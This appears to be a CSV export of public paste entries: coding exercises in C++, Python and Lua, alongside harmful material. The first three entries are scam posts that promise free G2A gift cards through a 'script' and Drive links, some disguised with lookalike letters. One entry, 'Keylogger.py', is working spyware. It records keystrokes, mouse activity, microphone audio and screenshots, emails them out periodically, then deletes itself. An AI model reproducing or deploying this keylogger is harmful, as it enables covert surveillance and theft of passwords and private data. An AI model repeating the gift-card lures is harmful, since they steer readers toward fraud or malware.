id,title,username,language,date,content
sxxChGUa,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Tuesday 23rd of April 2024 01:02:53 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
23 April 2024"
Dx3wMvAT,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jordanthebordan,GetText,Tuesday 23rd of April 2024 12:25:19 PM CDT,"G2А.com frеe gift cаrd & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to dаte versiоn of this scriрt. Any оther one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1J2K7N8g5mZ_Zp-S0cjQrax7KrPk97EG3/view?usp=sharing
 
Working as of:
23 April 2024"
8ff4XQPS,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Tuesday 23rd of April 2024 12:04:47 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_750364.pdf

Working as of:
23 April 2024"
Gm8p8HHM,Keylogger.py,Dynamic_Fantasy,Python,Tuesday 23rd of April 2024 11:56:45 AM CDT,"try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = [""pyscreenshot"",""sounddevice"",""pynput""]
    call(""pip install "" + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = ""YOUR_USERNAME""
    EMAIL_PASSWORD = ""YOUR_PASSWORD""
    SEND_REPORT_EVERY = 60 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = ""KeyLogger Started...""
            self.email = email
            self.password = password
        def appendlog(self, string):
            self.log = self.log + string
        def on_move(self, x, y):
            current_move = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_move)
        def on_click(self, x, y):
            current_click = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_click)
        def on_scroll(self, x, y):
            current_scroll = logging.info(""Mouse moved to {} {}"".format(x, y))
            self.appendlog(current_scroll)
        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = ""SPACE""
                elif key == key.esc:
                    current_key = ""ESC""
                else:
                    current_key = "" "" + str(key) + "" ""
            self.appendlog(current_key)
        def send_mail(self, email, password, message):
            sender = ""Private Person <from@example.com>""
            receiver = ""A Test User <to@example.com>""
            m = f""""""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}
            \n""""""
            m += message
            with smtplib.SMTP(""smtp.mailtrap.io"", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)
        def report(self):
            self.send_mail(self.email, self.password, ""\n\n"" + self.log)
            self.log = """"
            timer = threading.Timer(self.interval, self.report)
            timer.start()
        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)
        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == ""nt"":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system(""TASKKILL /F /IM "" + os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""DEL "" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system(""cd "" + pwd)
                    os.system('pkill leafpad')
                    os.system(""chattr -i "" +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system(""rm -rf"" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()"
8PUVb1uR,Combobox,plarmi,Python,Tuesday 23rd of April 2024 11:52:30 AM CDT,"import tkinter as tk
from tkinter import ttk

def change_color(event):
    # Получаем значение, которое выбрал пользователь
    selected_color = color_combobox.get()
    canvas.config(bg=selected_color)

# Создание главного окна
root = tk.Tk()
root.title(""Изменение цвета холста"")

# Создание выпадающего списка с цветами
colors = [""red"", ""green"", ""blue"", ""yellow"", ""violet""]
color_combobox = ttk.Combobox(root, values=colors, state=""readonly"")
color_combobox.set(""red"")
# Если было нажатие и сделан выбор, то будет меняться цвет
color_combobox.bind(""<<ComboboxSelected>>"", change_color)
color_combobox.pack(pady=20)

# Создание холста
canvas = tk.Canvas(root, width=200, height=200, bg=""red"")
canvas.pack(pady=20)

# Запуск главного цикла
root.mainloop()"
sq13Adjs,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:41:10 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};

void doSomething(Shape &r){
    cout << ""We will compute the area"" << endl;
    cout << ""The area is "" << r.getArea() << endl;
}


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if(s != NULL){
        doSomething(*s);
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}
"
rnHvfXHz,StargateDialing,PerryExtra,Lua,Tuesday 23rd of April 2024 11:41:07 AM CDT,"local arg = {...};
FAST_DIAL = false;

for _,v in pairs(arg) do
    if v == ""--fast"" then
        FAST_DIAL = true;
    elseif v then
        error(""Bad flag ["" .. v .. ""] failed to initialise"", 0);
    end
end

INTERFACE_TYPES = {
    ""basic_interface"",
    ""crystal_interface"",
    ""advanced_crystal_interface""
};
STARGATE_TYPES = {
    ""sgjourney:classic_stargate"",
    ""sgjourney:milky_way_stargate"",
    ""sgjourney:pegasus_stargate"",
    ""sgjourney:universe_stargate"",
    ""sgjourney:tollan_stargate""
};

--Find the proper interface--
INTERFACE_TYPE = INTERFACE_TYPES[1];
INTERFACE = peripheral.find(INTERFACE_TYPE);
if INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[2];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = INTERFACE_TYPES[3];
    INTERFACE = peripheral.find(INTERFACE_TYPE);
elseif INTERFACE == null then
    INTERFACE_TYPE = nil;
end

--If an interface is found get the Stargate Type--
if INTERFACE_TYPE == nil then
    STARGATE_TYPE = nil;
else
    STARGATE_TYPE = INTERFACE.getStargateType();
end

print(""Interface Type : "" .. INTERFACE_TYPE);
print(""Stargate Type : "" .. STARGATE_TYPE);

--Check if selected stargate and flags can be used by current Interface--
if (FAST_DIAL == true or STARGATE_TYPE ~= STARGATE_TYPES[2]) and INTERFACE_TYPE == INTERFACE_TYPES[1] then
    error(""\"""" .. INTERFACE_TYPES[1] .. ""\"" can only be used with \"""" .. STARGATE_TYPES[2] ""\"" in default manual dial mode"", 0);
end

function dial(address)
    local addressLength = #address;
    
    if addressLength == 8 then
        INTERFACE.setChevronConfiguration({0, 1, 2, 3, 4, 6, 7, 8, 5});
    elseif addressLength == 9 then
        INTERFACE.setChevronConfiguration({0, 1, 2, 3, 4, 5, 6, 7, 8});
    end
   
    local start = INTERFACE.getChevronsEngaged() + 1;
   
    if STARGATE_TYPE == STARGATE_TYPES[2] and FAST_DIAL == false then
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron];
        
            if chevron % 2 == 0 then
                INTERFACE.rotateClockwise(symbol);
            else
                INTERFACE.rotateAntiClockwise(symbol);
            end
        
            while(not INTERFACE.isCurrentSymbol(symbol))
            do
                sleep(0);
            end
		
            INTERFACE.endRotation();
        
            sleep(1);
            INTERFACE.openChevron();
		        
            sleep(0.5)
            if chevron < addressLength then
                INTERFACE.encodeChevron();
            end
		
            sleep(0.5);
            INTERFACE.closeChevron();
            sleep(1);
        end 
    else
        for chevron = start,addressLength,1
        do
            local symbol = address[chevron]
            
            interface.engageSymbol(symbol)
        end
    end
end

addresses = {
    {""Abydos"", {26, 6, 14, 31, 11, 29, 0}},
    {""Chulak"", {8, 1, 22, 14, 36, 19, 0}},
    {""Cavum Tenebrae"", {18, 7, 3, 36, 25, 15, 0}},
    {""Lantea"", {18, 20, 1, 15, 14, 7, 19, 0}},
    {""Nether"", {27, 23, 4, 34, 12, 28, 0}},
    {""End"", {13, 24, 2, 19, 3, 30, 0}},
    {""Aether"", {8, 7, 2, 17, 6, 21, 0}},
    {""Lost City"", {13, 4, 27, 8, 19, 3, 0}},
    {""ATM Mining"", {25, 33, 20, 7, 37, 17, 0}},
    {""ATM Other"", {12, 23, 36, 13, 21, 16, 0}},
    {""ATM Beyond"", {27, 5, 2, 23, 17, 38, 0}}
}

print(""Avaiting input:"")
for k,v in ipairs(addresses) do
    print(k .. "" : "" .. v[1])
end

input = tonumber(io.read())
sleep(0);

local addressLength = #addresses;
if input < 1 or input > addressLength then
    error(""Entered value is incorrect"", 0);
end
if #addresses[input][2] > 7 and INTERFACE_TYPE == INTERFACE_TYPES[1] then
    error(""Cannot dial 8 or 9 chevron address with \"""" .. INTERFACE_TYPES[1] .. ""\"" please upgrade to \"""" .. INTERFACE_TYPES[2] .. ""\"" or \"""" .. INTERFACE_TYPES[3] .. ""\"""");
end

dial(addresses[input][2]);"
mgjiVD7y,Untitled,biplovbhandari,Python,Tuesday 23rd of April 2024 11:39:45 AM CDT,"# Get relevant info from the JSON mixer file.
affine_transform = mixer[""projection""][""affine""][""doubleMatrix""]
patch_dims = mixer[""patchDimensions""]
patches_per_row = mixer[""patchesPerRow""]
total_patches = mixer[""totalPatches""]

# Path to your TFRecord file
tfrecord_file = '/content/drive/MyDrive/Colab Notebooks/DL_Book/Chapter_1/output/unet_v1/prediction/prediction_unet_v1.TFRecord'

# Define the feature description for deserialization
feature_description = {
    # Create a dictionary describing the features.
    'prediction': tf.io.FixedLenFeature([], tf.int64),
    'cropland_etc': tf.io.FixedLenFeature([], tf.float32),
    'rice': tf.io.FixedLenFeature([], tf.float32),
    'forest': tf.io.FixedLenFeature([], tf.float32),
    'urban': tf.io.FixedLenFeature([], tf.float32),
    'others_etc': tf.io.FixedLenFeature([], tf.float32),
}

def _parse_function(proto):
    return tf.io.parse_single_example(proto, feature_description)

# Create a dataset from the TFRecord file
raw_dataset = tf.data.TFRecordDataset(tfrecord_file)
parsed_dataset = raw_dataset.map(_parse_function)

from osgeo import gdal, osr
import cv2

# Initialize an empty array for the entire image
full_image = np.zeros((patch_dims[0] * (total_patches // patches_per_row),
                       patch_dims[1] * patches_per_row, 3), dtype=np.uint8)

# Iterate over each image in the parsed dataset
for i, features in enumerate(parsed_dataset):
    img = tf.image.decode_image(features['prediction']).numpy()
    row = i // patches_per_row
    col = i % patches_per_row
    full_image[row * patch_dims[0]:(row + 1) * patch_dims[0],
               col * patch_dims[1]:(col + 1) * patch_dims[1]] = img

# Create a GeoTIFF file
driver = gdal.GetDriverByName('GTiff')
outRaster = driver.Create('output.tif', full_image.shape[1], full_image.shape[0], 3, gdal.GDT_Byte)
outRaster.SetGeoTransform([affine_transform[2], affine_transform[0], 0,
                           affine_transform[5], 0, affine_transform[4]])

# Set the projection
outRasterSRS = osr.SpatialReference()
outRasterSRS.ImportFromEPSG(4326)
outRaster.SetProjection(outRasterSRS.ExportToWkt())

# Write the data
outband = outRaster.GetRasterBand(1)
outband.WriteArray(full_image[:,:,0])
outband = outRaster.GetRasterBand(2)
outband.WriteArray(full_image[:,:,1])
outband = outRaster.GetRasterBand(3)
outband.WriteArray(full_image[:,:,2])

# Flush data
outRaster.FlushCache()
"
yyN6fGjE,СПРИНТ № 7 | Модель памяти в C++ | Урок 10: Присваивание объектов 2/2,chevengur,C++,Tuesday 23rd of April 2024 11:21:47 AM CDT,"// Тут можно подключить scopedptr.h и ptrvector.h, 
// если они вам понадобятся.
#include <new> // Для исключения bad_alloc
#include <vector>
#include <cassert>
#include <algorithm>
#include <stdexcept>

using namespace std;
// Используйте эту заготовку PtrVector или замените её на свою реализацию
template <typename T>
class PtrVector {
public:
    PtrVector() = default;

    // Создаёт вектор указателей на копии объектов из other
    PtrVector(const PtrVector& other) {
        // Резервируем место в vector-е для хранения нужного количества элементов
        // Благодаря этому при push_back не будет выбрасываться исключение
        items_.reserve(other.items_.size());

        try {
            for (auto p : other.items_) {
                // Копируем объект, если указатель на него ненулевой
                auto p_copy = p ? new T(*p) : nullptr;  // new может выбросить исключение

                // Не выбросит исключение, т. к. в vector память уже зарезервирована
                items_.push_back(p_copy);
            }
        }
        catch (...) {
            // удаляем элементы в векторе и перевыбрасываем пойманное исключение
            DeleteItems();
            throw;
        }
    }

    // Деструктор удаляет объекты в куче, на которые ссылаются указатели,
    // в векторе items_
    ~PtrVector() {
        DeleteItems();
    }

    PtrVector& operator=(const PtrVector& rhs)
    {
        if (this != &rhs)
        {
            auto rhs_copy(rhs);
            swap_(rhs_copy);

        }
        return *this;
    }

    void swap_(PtrVector& other) noexcept
    {
        swap(other.items_, this->items_);
    }


    // Возвращает ссылку на вектор указателей
    vector<T*>& GetItems() noexcept {
        return items_;
    }

    // Возвращает константную ссылку на вектор указателей
    vector<T*> const& GetItems() const noexcept {
        return items_;
    }

private:
    void DeleteItems() noexcept {
        for (auto p : items_) {
            delete p;
        }
    }

    vector<T*> items_;
};

template <typename T>
class ScopedPtr {
public:
    ScopedPtr() = default;

    explicit ScopedPtr(T* raw_ptr) noexcept
        : ptr_(raw_ptr) {
    }

    // Запрещаем копирование указателя
    ScopedPtr(const ScopedPtr&) = delete;

    ~ScopedPtr() {
        delete ptr_;
    }

    T* GetRawPtr() const noexcept {
        return ptr_;
    }

    T* Release() noexcept {
        T* p = ptr_;
        ptr_ = nullptr;
        return p;
    }

    explicit operator bool() const {
        return ptr_ != nullptr;
    }

    T* operator->() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return ptr_;
    }

    T& operator*() const {
        using namespace std::literals;
        if (!ptr_) {
            throw std::logic_error(""Scoped ptr is null""s);
        }
        return *ptr_;
    }

private:
    T* ptr_ = nullptr;
};

using namespace std;
// Щупальце
class Tentacle {
public:
    explicit Tentacle(int id) noexcept
        : id_(id) {
    }

    int GetId() const noexcept {
        return id_;
    }

    Tentacle* GetLinkedTentacle() const noexcept {
        return linked_tentacle_;
    }
    void LinkTo(Tentacle& tentacle) noexcept {
        linked_tentacle_ = &tentacle;
    }
    void Unlink() noexcept {
        linked_tentacle_ = nullptr;
    }

private:
    int id_ = 0;
    Tentacle* linked_tentacle_ = nullptr;
};

// Осьминог
class Octopus {
public:
    Octopus()
        : Octopus(8) {
    }

    explicit Octopus(int num_tentacles) {
        Tentacle* t = nullptr;
        try {
            for (int i = 1; i <= num_tentacles; ++i) {
                t = new Tentacle(i);      // Может выбросить исключение bad_alloc
                tentacles_.GetItems().push_back(t);  // Может выбросить исключение bad_alloc

                // Обнуляем указатель на щупальце, которое уже добавили в tentacles_,
                // чтобы не удалить его в обработчике catch повторно
                t = nullptr;
            }
        }
        catch (const std::bad_alloc&) {
            // Удаляем щупальца, которые успели попасть в контейнер tentacles_
            Cleanup();
            // Удаляем щупальце, которое создали, но не добавили в tentacles_
            delete t;
            // Конструктор не смог создать осьминога с восемью щупальцами,
            // поэтому выбрасываем исключение, чтобы сообщить вызывающему коду об ошибке
            // throw без параметров внутри catch выполняет ПЕРЕВЫБРОС пойманного исключения
            throw;
        }
    }

    ~Octopus() {
        // Осьминог владеет объектами в динамической памяти (щупальца),
        // которые должны быть удалены при его разрушении.
        // Деструктор - лучшее место, чтобы прибраться за собой.
        Cleanup();
    }

    // Добавляет новое щупальце с идентификатором,
    // равным (количество_щупалец + 1):
    // 1, 2, 3, ...
    // Возвращает ссылку на добавленное щупальце
    Tentacle& AddTentacle() {
        ScopedPtr<Tentacle>tentacle(new Tentacle(GetTentacleCount() + 1));
        tentacles_.GetItems().push_back(tentacle.GetRawPtr());
        tentacle.Release();
        return *tentacles_.GetItems().back();
    }

    int GetTentacleCount() const noexcept {
        return static_cast<int>(tentacles_.GetItems().size());
    }

    const Tentacle& GetTentacle(size_t index) const {
        return *tentacles_.GetItems().at(index);
    }
    Tentacle& GetTentacle(size_t index) {
        return *tentacles_.GetItems().at(index);
    }

private:
    void Cleanup() {
        // Удаляем щупальца осьминога из динамической памяти
        for (Tentacle* t : tentacles_.GetItems()) {
            delete t;
        }
        // Очищаем массив указателей на щупальца
        tentacles_.GetItems().clear();
    }

    // Вектор хранит указатели на щупальца. Сами объекты щупалец находятся в куче

    PtrVector<Tentacle> tentacles_;
};

int main() {
    // Проверка присваивания осьминогов
    {
        Octopus octopus1(3);

        // Настраиваем состояние исходного осьминога
        octopus1.GetTentacle(2).LinkTo(octopus1.GetTentacle(1));

        // До присваивания octopus2 имеет своё собственное состояние
        Octopus octopus2(10);

        octopus2 = octopus1;

        // После присваивания осьминогов щупальца копии имеют то же состояние,
        // что и щупальца присваиваемого объекта
        assert(octopus2.GetTentacleCount() == octopus1.GetTentacleCount());
        for (int i = 0; i < octopus2.GetTentacleCount(); ++i) {
            auto& tentacle1 = octopus1.GetTentacle(i);
            auto& tentacle2 = octopus2.GetTentacle(i);
            assert(&tentacle2 != &tentacle1);
            assert(tentacle2.GetId() == tentacle1.GetId());
            assert(tentacle2.GetLinkedTentacle() == tentacle1.GetLinkedTentacle());
        }
    }

    // Проверка самоприсваивания осьминогов
    {
        Octopus octopus(3);

        // Настраиваем состояние осьминога
        octopus.GetTentacle(0).LinkTo(octopus.GetTentacle(1));

        vector<pair<Tentacle*, Tentacle*>> tentacles;
        // Сохраняем информацию о щупальцах осьминога и его копии
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            tentacles.push_back({ &octopus.GetTentacle(i), octopus.GetTentacle(i).GetLinkedTentacle() });
        }

        // Выполняем самоприсваивание
        octopus = octopus;

        // После самоприсваивания состояние осьминога не должно измениться
        assert(octopus.GetTentacleCount() == static_cast<int>(tentacles.size()));
        for (int i = 0; i < octopus.GetTentacleCount(); ++i) {
            auto& tentacle_with_link = tentacles.at(i);
            assert(&octopus.GetTentacle(i) == tentacle_with_link.first);
            assert(octopus.GetTentacle(i).GetLinkedTentacle() == tentacle_with_link.second);
        }
    }
}"
TAGUsYxK,Untitled,irmantas_radavicius,C++,Tuesday 23rd of April 2024 11:13:41 AM CDT,"#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cmath>
#include <ctime>
#include <cctype>

using namespace std;

class Shape {
    public:
        virtual double getArea() = 0;
};
class Square : public Shape {
    private:
        double a;
    public:
        Square(double a){
            this->a = a;
        }
        virtual double getArea(){
            return a*a;
        }
};
class Circle : public Shape {
    private:
        double r;
    public:
        Circle(double r){
            this->r = r;
        }
        virtual double getArea(){
            return 3.14159265358979323846*r*r;
        }
};


int main(){

    cout << ""Let's compute area."" << endl;

    Shape *s = NULL;

    cout << ""1 for square, 0 for circle?"" << endl;
    int x;
    cin >> x;

    if(x == 1){
        cout << ""Great. Please enter edge length: "" << endl;
        double edge;
        cin >> edge;
        s = new Square(edge);
    } else if(x == 0){
        cout << ""Great. Please enter radius length: "" << endl;
        double radius;
        cin >> radius;
        s = new Circle(radius);
    }

    if (s != NULL){
        cout << ""We will compute the area"" << endl;
        cout << ""The area is "" << s->getArea() << endl;
        delete s;
    }

    cout << ""Good bye"" << endl;
    return 0;
}"
